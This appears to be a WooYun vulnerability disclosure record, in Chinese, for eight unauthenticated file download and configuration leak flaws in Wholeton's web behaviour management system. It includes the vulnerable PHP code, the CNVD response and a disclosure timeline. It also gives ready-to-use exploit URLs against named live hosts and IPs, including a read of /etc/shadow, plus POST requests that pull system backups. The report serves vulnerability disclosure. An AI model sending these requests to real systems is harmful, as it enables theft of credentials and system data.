{"id": 23879, "wybug_id": "wooyun-2015-0103857", "wybug_title": "惠尔顿上网行为管理系统任意文件下载及信息泄露八处（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2015-03-26 15:38", "wybug_open_date": "2015-06-29 08:36", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "设计不当导致攻击界面扩大", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向公众公开  简要描述： 惠尔顿上网行为管理系统任意文件下载及信息泄露八处（无需登录） 详细说明：  惠尔顿上网行为管理系统任意文件下载及信息泄露八处（无需登录）官网经典案例：http://www.wholeton.com/Anli.php 外网部分实际案例： \n1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/\n先来看看五处任意文件下载吧首先简单过滤一下base目录下可能存在漏洞的文件：\nfind -name '*.php' | xargs grep  -l 'Content-Disposition'\n\n\n然后手工打开文件依次看看是否存在漏洞最后剩下这五处存在漏洞：\n1、http://222.223.56.116/base/web/downAnnex.php?filename=111111&path=/usr/local/WholetonTM/htdocs/base/web/downAnnex.php2、http://222.223.56.116/base/stats/download.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/3、http://222.223.56.116/base/stats/download_pdf.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/4、http://222.223.56.116/base/stats/download_txt.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/5、http://222.223.56.116/base/sys/download_file.php?filename=111111&path=/usr/local/WholetonTM/htdocs/base/web/downAnnex.php\n来看看第一个的代码：/base/web/downAnnex.php\n<?php \t$upload_file = $_REQUEST['filename'];\t$upload_dir= $_REQUEST['path'];\tif(file_exists($upload_dir)){\t\t$fp   =   fopen($upload_dir, \"r \");   \t\tHeader( \"Content-type:   application/octet-stream \"); \t\tHeader( \"Accept-Ranges:   bytes \"); \t\tHeader( \"Accept-Length:   \".filesize($upload_dir)); \t\tHeader( \"Content-Disposition:   attachment;   filename=\".iconv(\"utf-8\",'gb2312',$upload_file)); \t\techo   fread($fp,filesize($upload_dir)); \t\tfclose($fp); \t}?>\n直接fopen了$_REQUEST['path']在看下一个：文件/base/stats/download.php\n<?php\t$upload_dir  = $_REQUEST['path'];\t$upload_name = urldecode($_REQUEST['filename']);\tif(file_exists($upload_dir.$upload_name)){\t\t$path_parts = pathinfo($upload_name);\t\t$ext = strtolower($path_parts[\"extension\"]);\t\tswitch ($ext) {\t\t\tcase \"xls\":\t\t\theader(\"Content-type: application/vnd.ms-excel\"); // add here more headers for diff. extensions\t\t\tbreak;\t\t\tdefault;\t\t\theader(\"Content-type: application/octet-stream\");\t\t}\t\tHeader(\"HTTP/1.1 200 OK\");\t\tHeader( \"Accept-Ranges:   bytes \"); \t\tHeader( \"Accept-Length:   \".filesize($upload_dir.$upload_name)); \t\tHeader( \"Content-Disposition:   attachment;   filename=\".iconv(\"utf-8\",\"gb2312\",$upload_name)); \t\treadfile($upload_dir.$upload_name);\t}?>\n代码最后直接readfile($upload_dir.$upload_name)其他的基础原理都一样无需登录，直接下载你想要的任意文件即可都是一个类型的path为要下载的文件的路径filename为要下载的文件的名称，或者下载后的命名名称以第一个为例\n\n下载后111111文件就是downAnnex.php文件的源代码了比如最后一个\n\n下载后222222文件就是/etc/shadow文件的内容了============================================================================下面来看看可以随意下载系统配置文件的，无需登录，没有验证，直接下载系统配置文件，导致系统敏感信息泄漏，比如系统配置信息，系统用户账户信息等当然前面还有白帽子已经提交过一些了，这里再找出来三个\n1、http://222.223.56.116/base/sys/backfile.php（POST_DATA）m=backup2、http://222.223.56.116//base/vpn/download_bak.php3、http://222.223.56.116/base/web/ExportXml.php?type=1\n来看看第一个代码文件/base/sys/backfile.php\n<?php \tfunction down_load(){\t\t$file='/tmp/sys_init.tar.gz';\t\tif($fp=fopen($file,\"r\"))\t\t{\t\t\t$content = fread($fp,filesize($file));\t\t\tfclose($fp);\t\t}\t\t\t\theader(\"Content-disposition: filename=sys_date.bak\");\t\theader(\"Content-type: unknown/unknown\");\t\techo $content;\t}\tif($_POST['m']=='backup'){//备份数据\t\texec(\"rm -rf /tmp/sys_init.tar.gz\");\t\t$file='/tmp/sys_init.tar.gz';\t\texec(\"/usr/local/WholetonTM/pl_sh/backup\",$aaa);\t\tsleep (2);\t\tdown_load();\t\t$insert=1;\t}\tif($insert==\"1\"){\t\t$username=$_SESSION[\"user\"];\t\t$fp = fopen(\"/etc/systemlog.txt\",'a');\t\t$name =\"备份数据\";\t\t$lines = $username.\"\t\".date('Y-m-d H:i:s').\"\t\".$name.\"\\n\";\t\tfwrite($fp,$lines);\t\tfclose($fp);\t\t\t}?>\n当m=backup时，直接调用down_load函数，然后下载了系统的备份文件及系统全部配置信息内容以第一个为例，发送请求后下载sys_date.bak文件，要使用routerpassview.exe工具打开里面有各种系统信息，比如这里的账户：\n\n再比如第二个，下载的config.bak文件，里面的敏感信息更多\n\n   漏洞证明：  见详细说明   修复方案：  没有比重写更好的建议   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-31 08:34 厂商回复： CNVD确认并复现所述情况,已经由CNVD直接向软件生产厂商_深圳惠尔顿公司电话和邮件通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-26 16:19 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  又开刷了。。    \n     2015-03-26 16:23 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}